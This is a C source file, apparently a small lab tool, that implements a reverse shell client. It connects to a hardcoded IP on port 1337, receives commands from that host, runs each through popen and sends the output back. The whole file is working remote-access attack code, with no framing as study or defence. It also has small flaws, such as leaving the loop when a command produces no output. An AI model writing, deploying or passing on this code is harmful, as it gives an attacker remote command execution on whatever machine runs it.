//by lee
//gcc clinet.c -o client
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define SERVER_IP "192.168.239.131"
#define SERVER_PORT 1337

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char command[1024];
    char result[4096] = {0};


    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("❌ can not creat socket");
        exit(EXIT_FAILURE);
    }


    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    printf("🕤 wait for connection...");
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("❌ can not connect to server_ip");
        close(sock);
        exit(EXIT_FAILURE);
    }

    printf("✅ connect to  %s:%d success", SERVER_IP, SERVER_PORT);

    while (1) {
        memset(command, 0, sizeof(command));


        int recv_bytes = recv(sock, command, sizeof(command) - 1, 0);
        if (recv_bytes <= 0) {
            printf("❌ connection is break\n");
            break;
        }

        command[recv_bytes] = '\0';

        if (strncmp(command, "exit", 4) == 0) {
            printf("🔴 break connection\n");
            break;
        }


        FILE *fp = popen(command, "r"); // execute shell command
        if (fp == NULL) {
            char *error_msg = "❌ can not execute command\n";
            send(sock, error_msg, strlen(error_msg), 0);
            continue;
        }

				memset(result, 0, sizeof(result));
				fread(result, 1, sizeof(result) - 1, fp);
	
				if (strlen(result)==0){
            strcpy(result,"no output");
            break;
				}

				result[strlen(result)] = '\0';
				pclose(fp);

				send(sock, result, strlen(result), 0);
    }

    close(sock);
    return 0;
}
